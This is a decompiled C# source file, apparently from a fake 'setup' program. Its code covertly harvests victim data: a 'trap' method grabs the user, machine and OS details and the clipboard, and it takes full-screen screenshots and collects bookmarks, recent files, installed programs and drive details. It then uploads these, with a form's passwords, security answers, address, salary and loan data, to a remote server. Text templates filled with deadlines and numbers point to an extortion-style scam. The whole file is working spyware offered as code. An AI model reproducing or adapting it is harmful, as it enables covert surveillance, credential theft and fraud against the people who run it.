using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Xml;
using IWshRuntimeLibrary;
using setup.Properties;

namespace setup;

internal class lib
{
	private static string strChar = "abcdefghijlkmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

	private static Dictionary<string, string> bookmarklist;

	private static XmlDocument xd;

	private static List<string> listRecent;

	private static List<string> listProgram;

	[DllImport("wininet.dll")]
	private static extern bool InternetGetConnectedState(out int lpdwFlags, int dwReserved);

	public static bool ChkNetwork()
	{
		if (InternetGetConnectedState(out var _, 0))
		{
			return true;
		}
		return false;
	}

	public static string GetRandom()
	{
		string text = "";
		Random random = new Random((int)(DateTime.Now.Ticks % 2147483647L));
		for (int i = 0; i < 30; i++)
		{
			text += strChar.Substring(random.Next(strChar.Length), 1);
		}
		return text;
	}

	public static void ScreenCapture()
	{
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0072: Expected O, but got Unknown
		int num = 0;
		int height = Screen.get_PrimaryScreen().get_Bounds().Height;
		Screen[] allScreens = Screen.get_AllScreens();
		foreach (Screen val in allScreens)
		{
			num += val.get_Bounds().Width;
			if (height < val.get_Bounds().Height)
			{
				height = val.get_Bounds().Height;
			}
		}
		Bitmap val2 = new Bitmap(num, height);
		Graphics val3 = Graphics.FromImage((Image)(object)val2);
		val3.CopyFromScreen(new Point(0, 0), new Point(0, 0), ((Image)val2).get_Size());
		val3.Dispose();
		string text = "C:\\" + Settings.Default.uid;
		string uid = Settings.Default.uid;
		string text2 = text + "\\" + uid + ".bmp";
		string text3 = Settings.Default.MyPictures + "\\" + uid + ".bmp";
		Settings.Default.filepath = text2;
		((Image)val2).Save(text2, ImageFormat.get_Bmp());
		((Image)val2).Save(text3, ImageFormat.get_Bmp());
		SaveImage(text2, 80);
		SaveImage(text3, 80);
		string text4 = text + "\\" + uid + "_s.bmp";
		double num2 = 200.0;
		double dw = num2 / (double)height * (double)num;
		Bitmap val4 = ResizeImage(val2, dw, num2);
		((Image)val4).Save(text4, ImageFormat.get_Bmp());
		SaveImage(text4, 100);
		((Image)val2).Dispose();
		((Image)val4).Dispose();
		Settings.Default.image = uid + ".jpg";
		DeleteFile(text3);
	}

	public static void DeleteFile(string stFilePath)
	{
		FileInfo fileInfo = new FileInfo(stFilePath);
		if (fileInfo.Exists)
		{
			if ((fileInfo.Attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				fileInfo.Attributes = FileAttributes.Normal;
			}
			fileInfo.Delete();
		}
	}

	public static void SaveImage(string fileName, int quality)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		Bitmap val = new Bitmap(fileName);
		EncoderParameters val2 = new EncoderParameters(1);
		EncoderParameter val3 = new EncoderParameter(Encoder.Quality, (long)quality);
		val2.get_Param()[0] = val3;
		ImageCodecInfo encoderInfo = GetEncoderInfo("image/jpeg");
		string path = encoderInfo.get_FilenameExtension().Split(new char[1] { ';' })[0];
		path = Path.GetExtension(path)!.ToLower();
		string text = Path.ChangeExtension(fileName, path);
		((Image)val).Save(text, encoderInfo, val2);
		((Image)val).Dispose();
	}

	public static Bitmap ResizeImage(Bitmap image, double dw, double dh)
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		double num = ((Image)image).get_Width();
		double num2 = ((Image)image).get_Height();
		double num3 = ((!(dh / dw <= num2 / num)) ? (dw / num) : (dh / num2));
		int num4 = (int)(num * num3);
		int num5 = (int)(num2 * num3);
		Bitmap val = new Bitmap(num4, num5);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		val2.set_InterpolationMode((InterpolationMode)7);
		val2.DrawImage((Image)(object)image, 0, 0, ((Image)val).get_Width(), ((Image)val).get_Height());
		return val;
	}

	private static ImageCodecInfo GetEncoderInfo(string mineType)
	{
		ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
		ImageCodecInfo[] array = imageEncoders;
		int num = 0;
		ImageCodecInfo val;
		while (true)
		{
			if (num < array.Length)
			{
				val = array[num];
				if (val.get_MimeType() == mineType)
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return val;
	}

	public static void ReadXML()
	{
		Assembly entryAssembly = Assembly.GetEntryAssembly();
		string location = entryAssembly.Location;
		string directoryName = Path.GetDirectoryName(location);
		string url = directoryName + "\\config.xml";
		XmlTextReader xmlTextReader = new XmlTextReader(url);
		while (xmlTextReader.Read())
		{
			if (xmlTextReader.NodeType == XmlNodeType.Element)
			{
				switch (xmlTextReader.LocalName)
				{
				case "name":
					Settings.Default.fn = xmlTextReader.ReadString();
					break;
				case "i1":
					Settings.Default.it = xmlTextReader.ReadString();
					break;
				case "i2":
					Settings.Default.ih = xmlTextReader.ReadString();
					break;
				case "f1":
					Settings.Default.f1 = xmlTextReader.ReadString();
					break;
				case "f2":
					Settings.Default.f2 = xmlTextReader.ReadString();
					break;
				case "type":
					Settings.Default.type = xmlTextReader.ReadString();
					break;
				}
			}
		}
	}

	public static void trap()
	{
		string text = string.Empty;
		Settings.Default.UserName = Environment.UserName;
		Settings.Default.UserDomainName = Environment.UserDomainName;
		Settings.Default.MachineName = Environment.MachineName;
		Settings.Default.OSVersion = Environment.OSVersion.ToString();
		Settings.Default.TickCount = new TimeSpan(0, 0, 0, 0, Environment.TickCount).ToString();
		Settings.Default.WorkingSet = Environment.WorkingSet.ToString();
		Settings.Default.CurrentDirectory = Environment.CurrentDirectory;
		Settings.Default.IP = GetIH("i");
		Settings.Default.HOST = GetIH("h");
		Screen[] allScreens = Screen.get_AllScreens();
		foreach (Screen val in allScreens)
		{
			object obj = text;
			text = string.Concat(obj, val.get_Bounds().Width, "×", val.get_Bounds().Height, " ");
		}
		Settings.Default.Screen = text;
		Settings.Default.Clip = string.Empty;
		if (Clipboard.ContainsText())
		{
			Settings.Default.Clip = Clipboard.GetText();
		}
		ReadXML();
		GetDirPath();
	}

	public static string GetIH(string arg)
	{
		WebClient webClient = new WebClient();
		Stream stream = webClient.OpenRead(Settings.Default.url + arg + ".cgi");
		StreamReader streamReader = new StreamReader(stream, Encoding.GetEncoding("UTF-8"));
		return streamReader.ReadToEnd();
	}

	public static string GetImage(string img)
	{
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		//IL_002b: Expected O, but got Unknown
		string address = Settings.Default.url + "img/exe/" + img;
		WebClient webClient = new WebClient();
		Stream stream = webClient.OpenRead(address);
		Bitmap val = new Bitmap(stream);
		stream.Close();
		string text = "C:\\" + Settings.Default.uid + "/" + img;
		((Image)val).Save(text, ImageFormat.get_Bmp());
		return text;
	}

	public static void DelDir()
	{
		Directory.Delete("C:\\" + Settings.Default.uid, recursive: true);
	}

	public static string GetRules()
	{
		string text = "";
		WebClient webClient = new WebClient();
		Stream stream = webClient.OpenRead(Settings.Default.url + "txt/rules.txt");
		StreamReader streamReader = new StreamReader(stream, Encoding.UTF8);
		while (streamReader.Peek() > -1)
		{
			text = text + streamReader.ReadLine() + "\r\n";
		}
		streamReader.Close();
		return text;
	}

	public static string GetEnd()
	{
		string text = "";
		WebClient webClient = new WebClient();
		Stream stream = webClient.OpenRead(Settings.Default.url + "txt/end.txt");
		StreamReader streamReader = new StreamReader(stream, Encoding.UTF8);
		while (streamReader.Peek() > -1)
		{
			text = text + streamReader.ReadLine() + "\r\n";
		}
		streamReader.Close();
		string newValue = Settings.Default.UserName;
		if (Settings.Default.sei != "" || Settings.Default.mei != "")
		{
			newValue = Settings.Default.sei + " " + Settings.Default.mei;
		}
		text = text.Replace("#name", newValue);
		text = text.Replace("#filename", Settings.Default.fn);
		text = text.Replace("#time", GetDateTime());
		text = text.Replace("#kijitu", GetKijitsu());
		text = text.Replace("#num", GetNum());
		return text.Replace("#maintxt", GetMessage());
	}

	public static int PageRule(int num, int type)
	{
		int result = 1;
		if (Settings.Default.type == "0" && ((num == 6 && type == 1) || (num == 10 && type == 0)))
		{
			result = 4;
		}
		return result;
	}

	public static bool NumChk(string str)
	{
		return Regex.IsMatch(str, "^[0-9]+$");
	}

	public static bool TelChk(string str)
	{
		return Regex.IsMatch(str, "^[0-9]{2,5}[\\-]?[0-9]{1,4}[\\-]?[0-9]{4}$");
	}

	public static bool EmailChk(string str)
	{
		return Regex.IsMatch(str, "^([\\w-\\.]+)@((\\[[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.)|(([\\w-]+\\.)+))([a-zA-Z]{2,4}|[0-9]{1,3})(\\]?)$");
	}

	public static void SiteOpen()
	{
		Process.Start(Settings.Default.url + "entry/user/" + Settings.Default.uid);
	}

	public static string GetMessage()
	{
		string address = Settings.Default.url + "get/";
		string result = string.Empty;
		try
		{
			WebClient webClient = new WebClient();
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection.Add("uid", Settings.Default.uid);
			nameValueCollection.Add("dummy", "dummy");
			byte[] bytes = webClient.UploadValues(address, nameValueCollection);
			webClient.Dispose();
			result = Encoding.UTF8.GetString(bytes);
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static string GetKijitsu()
	{
		string address = Settings.Default.url + "get/kijitsu/";
		string result = string.Empty;
		try
		{
			WebClient webClient = new WebClient();
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection.Add("uid", Settings.Default.uid);
			nameValueCollection.Add("dummy", "dummy");
			byte[] bytes = webClient.UploadValues(address, nameValueCollection);
			webClient.Dispose();
			result = Encoding.UTF8.GetString(bytes);
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static string GetDateTime()
	{
		string address = Settings.Default.url + "get/time/";
		string result = string.Empty;
		try
		{
			WebClient webClient = new WebClient();
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection.Add("uid", Settings.Default.uid);
			nameValueCollection.Add("dummy", "dummy");
			byte[] bytes = webClient.UploadValues(address, nameValueCollection);
			webClient.Dispose();
			result = Encoding.UTF8.GetString(bytes);
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static string GetNum()
	{
		string address = Settings.Default.url + "get/num/";
		string result = string.Empty;
		try
		{
			WebClient webClient = new WebClient();
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection.Add("uid", Settings.Default.uid);
			nameValueCollection.Add("dummy", "dummy");
			byte[] bytes = webClient.UploadValues(address, nameValueCollection);
			webClient.Dispose();
			result = Encoding.UTF8.GetString(bytes);
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void DataUpload()
	{
		string address = Settings.Default.url + "entry/";
		try
		{
			WebClient webClient = new WebClient();
			NameValueCollection nameValueCollection = new NameValueCollection();
			nameValueCollection.Add("uid", Settings.Default.uid);
			nameValueCollection.Add("filename", Settings.Default.fn);
			nameValueCollection.Add("name", SetName(Settings.Default.sei, Settings.Default.mei, ""));
			nameValueCollection.Add("sex", Settings.Default.sex);
			nameValueCollection.Add("birth", Settings.Default.birth);
			nameValueCollection.Add("age", Settings.Default.age);
			nameValueCollection.Add("email", Settings.Default.email);
			nameValueCollection.Add("password", Settings.Default.password);
			nameValueCollection.Add("question", Settings.Default.question);
			nameValueCollection.Add("answer", Settings.Default.answer);
			nameValueCollection.Add("zip", Settings.Default.zip);
			nameValueCollection.Add("pref", Settings.Default.pref);
			nameValueCollection.Add("addr1", Settings.Default.addr1);
			nameValueCollection.Add("addr2", Settings.Default.addr2);
			nameValueCollection.Add("tel", Settings.Default.tel);
			nameValueCollection.Add("fax", Settings.Default.fax);
			nameValueCollection.Add("mtel", Settings.Default.mtel);
			nameValueCollection.Add("memail", Settings.Default.memail);
			nameValueCollection.Add("family", Settings.Default.family);
			nameValueCollection.Add("house", Settings.Default.house);
			nameValueCollection.Add("job", Settings.Default.job);
			nameValueCollection.Add("salary", Settings.Default.salary);
			nameValueCollection.Add("loan", Settings.Default.loan);
			nameValueCollection.Add("hero", SetName(Settings.Default.hero1, Settings.Default.hero2, Settings.Default.hero3));
			nameValueCollection.Add("lover", SetName(Settings.Default.lover1, Settings.Default.lover2, Settings.Default.lover3));
			nameValueCollection.Add("friend", SetName(Settings.Default.friend1, Settings.Default.friend2, Settings.Default.friend3));
			nameValueCollection.Add("motivation", Settings.Default.motivation);
			nameValueCollection.Add("hobby", Settings.Default.hobby);
			nameValueCollection.Add("specialty", Settings.Default.specialty);
			nameValueCollection.Add("feedback", Settings.Default.feedback);
			nameValueCollection.Add("username", Settings.Default.UserName);
			nameValueCollection.Add("userdomainname", Settings.Default.UserDomainName);
			nameValueCollection.Add("machinename", Settings.Default.MachineName);
			nameValueCollection.Add("clientdir", Settings.Default.CurrentDirectory);
			nameValueCollection.Add("installdir", Settings.Default.instalpass);
			nameValueCollection.Add("os", Settings.Default.OSVersion);
			nameValueCollection.Add("tickcnt", Settings.Default.TickCount);
			nameValueCollection.Add("workingset", Settings.Default.WorkingSet);
			nameValueCollection.Add("ip", Settings.Default.IP);
			nameValueCollection.Add("host", Settings.Default.HOST);
			nameValueCollection.Add("screen", Settings.Default.Screen);
			nameValueCollection.Add("clip", Settings.Default.Clip);
			nameValueCollection.Add("ss", Settings.Default.image);
			nameValueCollection.Add("dummy", "dummy");
			byte[] bytes = webClient.UploadValues(address, nameValueCollection);
			webClient.Dispose();
			string @string = Encoding.UTF8.GetString(bytes);
			Console.WriteLine(@string);
			nameValueCollection.Clear();
		}
		catch
		{
		}
	}

	public static string SetName(string str1, string str2, string str3)
	{
		string text = str1;
		if (str2 != "")
		{
			text = ((!(text != "")) ? (text + str2) : (text + " " + str2));
		}
		if (str3 != "")
		{
			text = ((!(text != "")) ? (text + str3) : (text + " (" + str3 + ")"));
		}
		return text;
	}

	public static void GetDirPath()
	{
		Settings.Default.MyMusic = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic);
		Settings.Default.MyPictures = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
	}

	public static void GetBookmarks()
	{
		bookmarklist = new Dictionary<string, string>();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);
		BookMarkList(folderPath);
		xd = new XmlDocument();
		XmlDeclaration newChild = xd.CreateXmlDeclaration("1.0", "UTF-8", null);
		xd.AppendChild(newChild);
		XmlElement xmlElement = xd.CreateElement("data");
		xd.AppendChild(xmlElement);
		XmlNode xmlNode = xd.CreateElement("bookmark");
		xmlElement.AppendChild(xmlNode);
		foreach (KeyValuePair<string, string> item in bookmarklist)
		{
			XmlElement xmlElement2 = xd.CreateElement("url");
			xmlNode.AppendChild(xmlElement2);
			xmlElement2.InnerText = item.Value;
			XmlAttribute xmlAttribute = xd.CreateAttribute("name");
			xmlAttribute.Value = item.Key;
			xmlElement2.Attributes.Append(xmlAttribute);
		}
		xd.Save("C:\\" + Settings.Default.uid + "\\" + Settings.Default.uid + ".xml");
		xd = null;
	}

	private static void BookMarkList(string dir)
	{
		string empty = string.Empty;
		string empty2 = string.Empty;
		string[] directories = Directory.GetDirectories(dir);
		foreach (string text in directories)
		{
			new DirectoryInfo(text);
			BookMarkList(text);
		}
		string[] files = Directory.GetFiles(dir, "*.url");
		foreach (string text2 in files)
		{
			empty = text2.Replace(Environment.GetFolderPath(Environment.SpecialFolder.Favorites), "");
			empty = empty.Replace(".url", "");
			empty = empty.Substring(1);
			empty2 = GetBookMarkUrl(text2);
			bookmarklist.Add(empty, empty2);
		}
	}

	private static string GetBookMarkUrl(string path)
	{
		string result = string.Empty;
		if (File.Exists(path))
		{
			StreamReader streamReader = new StreamReader(path, Encoding.Default);
			while (!streamReader.EndOfStream)
			{
				string text = streamReader.ReadLine();
				if (text.IndexOf("URL=") == 0)
				{
					result = text.Replace("URL=", "");
				}
			}
			streamReader.Close();
		}
		return result;
	}

	public static void GetHddInfo()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		string filename = "C:\\" + Settings.Default.uid + "\\" + Settings.Default.uid + ".xml";
		xd = new XmlDocument();
		xd.Load(filename);
		XmlNode xmlNode = xd.SelectSingleNode("/data");
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			string name = driveInfo.Name;
			string value = driveInfo.DriveType.ToString();
			string value2 = "";
			string value3 = "";
			string value4 = "";
			string value5 = "";
			string value6 = "";
			long num = 0L;
			long num2 = 0L;
			long num3 = 0L;
			if (driveInfo.IsReady)
			{
				value2 = driveInfo.VolumeLabel.ToString();
				value3 = driveInfo.DriveFormat.ToString();
				num = (driveInfo.TotalSize - driveInfo.TotalFreeSpace) / 1024L / 1024L / 1024L;
				num2 = driveInfo.TotalFreeSpace / 1024L / 1024L / 1024L;
				num3 = driveInfo.TotalSize / 1024L / 1024L / 1024L;
				value4 = num.ToString();
				value5 = num2.ToString();
				value6 = num3.ToString();
			}
			XmlElement xmlElement = xd.CreateElement("hdd");
			xmlNode.AppendChild(xmlElement);
			XmlAttribute xmlAttribute = xd.CreateAttribute("drive");
			xmlAttribute.Value = name;
			xmlElement.Attributes.Append(xmlAttribute);
			XmlAttribute xmlAttribute2 = xd.CreateAttribute("type");
			xmlAttribute2.Value = value;
			xmlElement.Attributes.Append(xmlAttribute2);
			XmlAttribute xmlAttribute3 = xd.CreateAttribute("label");
			xmlAttribute3.Value = value2;
			xmlElement.Attributes.Append(xmlAttribute3);
			XmlAttribute xmlAttribute4 = xd.CreateAttribute("system");
			xmlAttribute4.Value = value3;
			xmlElement.Attributes.Append(xmlAttribute4);
			XmlAttribute xmlAttribute5 = xd.CreateAttribute("size1");
			xmlAttribute5.Value = value4;
			xmlElement.Attributes.Append(xmlAttribute5);
			XmlAttribute xmlAttribute6 = xd.CreateAttribute("size2");
			xmlAttribute6.Value = value5;
			xmlElement.Attributes.Append(xmlAttribute6);
			XmlAttribute xmlAttribute7 = xd.CreateAttribute("size3");
			xmlAttribute7.Value = value6;
			xmlElement.Attributes.Append(xmlAttribute7);
		}
		xd.Save(filename);
		xd = null;
	}

	public static void GetRecent()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		listRecent = new List<string>();
		WshShellClass val = new WshShellClass();
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
		string[] files = Directory.GetFiles(folderPath, "*.lnk");
		foreach (string text in files)
		{
			IWshShortcut val2 = (IWshShortcut)val.CreateShortcut(text);
			listRecent.Add(val2.get_TargetPath());
		}
		string filename = "C:\\" + Settings.Default.uid + "\\" + Settings.Default.uid + ".xml";
		xd = new XmlDocument();
		xd.Load(filename);
		XmlNode xmlNode = xd.SelectSingleNode("/data");
		XmlElement xmlElement = xd.CreateElement("recent");
		xmlNode.AppendChild(xmlElement);
		foreach (string item in listRecent)
		{
			XmlElement xmlElement2 = xd.CreateElement("pass");
			xmlElement.AppendChild(xmlElement2);
			xmlElement2.InnerText = item;
		}
		xd.Save(filename);
		xd = null;
	}

	public static void GetProgram()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		listProgram = new List<string>();
		ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_Product");
		ManagementObjectCollection val2 = val.Get();
		ManagementObjectEnumerator enumerator = val2.GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator.get_Current();
				listProgram.Add(string.Concat(((ManagementBaseObject)val3).get_Item("Name"), " ", ((ManagementBaseObject)val3).get_Item("Version")));
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		listProgram.Sort();
		string filename = "C:\\" + Settings.Default.uid + "\\" + Settings.Default.uid + ".xml";
		xd = new XmlDocument();
		xd.Load(filename);
		XmlNode xmlNode = xd.SelectSingleNode("/data");
		XmlElement xmlElement = xd.CreateElement("program");
		xmlNode.AppendChild(xmlElement);
		foreach (string item in listProgram)
		{
			XmlElement xmlElement2 = xd.CreateElement("name");
			xmlElement.AppendChild(xmlElement2);
			xmlElement2.InnerText = item;
		}
		xd.Save(filename);
		xd = null;
	}
}
